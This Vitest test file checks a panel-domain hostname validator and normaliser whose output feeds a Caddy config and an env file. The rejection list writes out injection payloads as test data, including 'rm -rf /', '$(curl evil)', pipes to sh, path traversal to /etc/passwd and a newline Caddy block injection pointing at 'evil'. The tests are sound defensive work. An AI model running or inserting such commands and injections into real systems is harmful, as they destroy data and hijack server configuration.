import { describe, expect, it } from "vitest";

import { isPanelHostname, normalizePanelDomain } from "./panel-domain";

describe("isPanelHostname — accepts valid custom panel domains", () => {
	const valid = [
		"panel.example.org".replace("example.org", "vibe.dev"), // panel.vibe.dev
		"panel.mysite.com",
		"control.acme.io",
		"a.bc",
		"x1.y2.z3.tld",
		"panel-1.my-site.co.uk",
		"sub.sub2.sub3.domain.tld",
		// max label (63 chars) is allowed
		`${"a".repeat(63)}.example-host.dev`,
	];
	for (const d of valid) {
		it(`accepts ${d}`, () => {
			expect(isPanelHostname(d)).toBe(true);
		});
	}
});

describe("isPanelHostname — rejects invalid / unsafe values", () => {
	const invalid: [string, string][] = [
		["", "empty"],
		["localhost", "reserved exact"],
		["panel.localhost", "reserved suffix"],
		["panel.test", "reserved .test"],
		["panel.invalid", "reserved .invalid"],
		["panel.example.com", "reserved example.com"],
		["nodot", "single label (no dot)"],
		[".panel.com", "leading dot"],
		["panel.com.", "trailing dot"],
		["panel..com", "double dot"],
		["-panel.com", "leading dash"],
		["panel.com-", "trailing dash"],
		["pa nel.com", "whitespace"],
		["Panel.com", "uppercase"],
		["PANEL.COM", "uppercase"],
		["panel.com/admin", "slash (path)"],
		["panel.com:8443", "colon (port)"],
		["https://panel.com", "scheme"],
		[`${"a".repeat(64)}.com`, "label > 63 chars"],
		[`${"a.".repeat(127)}com`, "total > 253 chars"],
		// --- injection vectors: these must NEVER pass (they would land in a Caddy
		// config file and/or the env file). The positive [a-z0-9.-] allowlist blocks
		// every one of them.
		["panel.com {", "caddy block-open metachar"],
		[
			"panel.com }\nadmin.com {\n  reverse_proxy evil:1",
			"newline + caddy inject",
		],
		["panel.com, evil.com", "comma + space (address-list inject)"],
		["panel.com;rm -rf /", "shell command separator"],
		["panel.com|sh", "pipe"],
		["panel.com&whoami", "background ampersand"],
		["$(curl evil)", "command substitution"],
		["`whoami`.com", "backtick substitution"],
		["panel.com>file", "redirect"],
		["panel.com#frag", "hash"],
		["panel.*.com", "glob star"],
		["panel_underscore.com", "underscore not allowed"],
		["pan\tel.com", "tab"],
		["../../etc/passwd", "path traversal"],
	];
	for (const [value, why] of invalid) {
		it(`rejects ${JSON.stringify(value)} (${why})`, () => {
			expect(isPanelHostname(value)).toBe(false);
		});
	}
});

describe("normalizePanelDomain", () => {
	it("trims and lowercases", () => {
		expect(normalizePanelDomain("  Panel.Example.DEV  ")).toBe(
			"panel.example.dev"
		);
	});
	it("strips a pasted scheme", () => {
		expect(normalizePanelDomain("https://panel.mysite.com")).toBe(
			"panel.mysite.com"
		);
	});
	it("strips a path", () => {
		expect(normalizePanelDomain("panel.mysite.com/login")).toBe(
			"panel.mysite.com"
		);
	});
	it("strips a port", () => {
		expect(normalizePanelDomain("panel.mysite.com:8443")).toBe(
			"panel.mysite.com"
		);
	});
	it("normalization does not rescue an invalid host", () => {
		// Even after normalize, a metachar-bearing value is rejected by isPanelHostname.
		const n = normalizePanelDomain("https://Panel.com;rm -rf/");
		expect(isPanelHostname(n)).toBe(false);
	});
	it("normalize + validate accepts a realistically pasted value", () => {
		const n = normalizePanelDomain("HTTPS://Panel.MySite.com/");
		expect(n).toBe("panel.mysite.com");
		expect(isPanelHostname(n)).toBe(true);
	});
});
